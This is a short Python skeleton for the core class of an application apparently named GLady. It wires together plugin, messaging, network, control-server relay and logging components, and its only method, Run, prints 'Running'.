from Source.Core.PluginManager import PluginManager
from Source.Core.CommunicationBus import CommunicationBus
from Source.Core.NetworkManager import NetworkManager
from Source.Core.ControlServerRelay import ControlServerRelay
from Source.Core.Logger import Logger

# GLady's core is the mandatory module, that cannot be disabled, it is responsible for:
#   - Loading and configuring plugins;
#   - Processing inter-plugin communications;
#   - Processing network communication with other instances of GLady core;
#   - Receiving and rerouting commands from control servers;
#   - Handling execution logs.

class GLadyCore:

    def __init__(self):
        self.pluginManager = PluginManager(self)
        self.communicationBus = CommunicationBus(self)
        self.networkManager = NetworkManager(self)
        self.controlServerRelay = ControlServerRelay(self)
        self.logger = Logger(self)


    # Starts an instance of GLady core application
    def Run(self):

        print("Running")